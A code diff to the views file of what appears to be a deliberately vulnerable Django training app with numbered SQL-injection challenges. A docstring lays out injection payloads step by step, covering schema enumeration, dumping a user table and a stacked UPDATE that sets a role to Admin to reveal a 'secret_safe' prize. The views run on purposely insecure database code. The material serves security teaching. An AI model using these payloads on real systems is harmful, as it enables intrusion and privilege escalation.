@@ -56,7 +56,7 @@ def fill_vehicle_db():
 
 def init_secret_db():
     item = BlindSecret(1, 'Bingo')
-    item.save()
+    item.save(using="problems_db")
 
 
 def check_answer_input(real_answer, user_answer):
@@ -67,6 +67,24 @@ def check_answer_input(real_answer, user_answer):
         return True
     else:
         return False
+
+
+def init_safe_db():
+    prize_amount = 10000000
+    safe = Safe(1, '4-8-15-23-48', prize_amount)
+    safe.save(using="problems_db")
+    return prize_amount
+
+
+def init_mockup_user_db(user):
+    items = [
+
+        User(user.id + 1, 'yxiltih', 'notsu@gmail.com', '901a706ec09c2466e450e5ccda37c5', UserRole.ADMIN.value),
+        User(user.id, user.username, user.email, user.password, UserRole.USER.value)
+
+    ]
+    for item in items:
+        item.save(using="problems_db")
 
 
 def update_answer_for_user(user, problem_name):
@@ -184,11 +202,12 @@ def third_problem(request):
         context['num_resulted_items'] = len(result)
     return render(request, 'problems/3.html', context)
 
+
 @login_required
 def forth_problem(request):
+    fill_vehicle_db()
     global_logger.error(" forth_problem view called ")
     context = {'message': "Out of stock"}
-    # fill_vehicle_db()
 
     cursor = connections['problems_db'].cursor()
     if request.method == 'POST':
@@ -237,7 +256,7 @@ def sixth_problem(request):
     init_secret_db()
 
     context = {
-        'secret_value': BlindSecret.objects.filter(id=1)[0].secret
+        'secret_value': BlindSecret.objects.using("problems_db").filter(id=1)[0].secret
     }
 
     cursor2 = connections['problems_db'].cursor()
@@ -261,40 +280,23 @@ def seventh_problem(request):
     return render(request, 'problems/7.html')
 
 
-def init_safe_db():
-    prize_amount = 10000000
-    safe = Safe(1, '4-8-15-23-48', prize_amount)
-    safe.save(using="problems_db")
-    return prize_amount
-
-
-def init_mockup_user_db(user):
-    items = [
-        User(user.id + 1, 'yxiltih', 'notsu@gmail.com', '901a706ec09c2466e450e5ccda37c5', UserRole.ADMIN.value),
-        User(user.id, user.username, user.email, user.password, UserRole.USER.value)
-
-    ]
-    for item in items:
-        item.save(using="problems_db")
-
-
 '''
     Note: Trying to get an error message gets the table name.
     Trying to access the table with will result in special 'no access message'
-    
+
     Step #1: a'; SELECT table_schema,table_name 
                FROM information_schema.tables 
                WHERE table_schema LIKE 'public' 
                ORDER BY table_schema, table_name--#
     Need to find the table where user data is store - db_users
-    
+
     Step #2: a'; select * from db_users --# 
     To get all rows -> will se admin, manager and user roles
-    
+
     Step #2.5: In case user doesn't guess or finds out the column 'role'
     it's possible to get it by the following command:
     1'; select * from information_schema.columns where table_name='db_users' --#
-    
+
     Step #3: Update user privileges, then try to access the secret_safe
     a'; UPDATE db_users SET role = 'Admin' WHERE db_users.id = 1; select * from db_users; select prize from secret_safe where 1=1 --#
 '''
@@ -322,12 +324,12 @@ def eighth_problem(request):
         if 'secret_safe' in secret_pass_request:
             per_flag = True
         for itr in context['result']:
-            print(itr)
+ #           print(itr)
             if itr[0] == prize_amount:
                 per_flag = True
                 break
         if per_flag:
-            print('jere')
+#            print('jere')
             permission = User.objects.using("problems_db").get(pk=request.user.id).role == 'Admin'
             context['result'] = [] if permission is False else context['result']
             context['error'] = "You Don't Have Permission To View This Data" if permission is False else None
@@ -335,3 +337,7 @@ def eighth_problem(request):
     return render(request, 'problems/8.html', context)
 
 
+@login_required
+def ninth_problem(request):
+    context = {}
+    return render(request, 'problems/9.html', context)
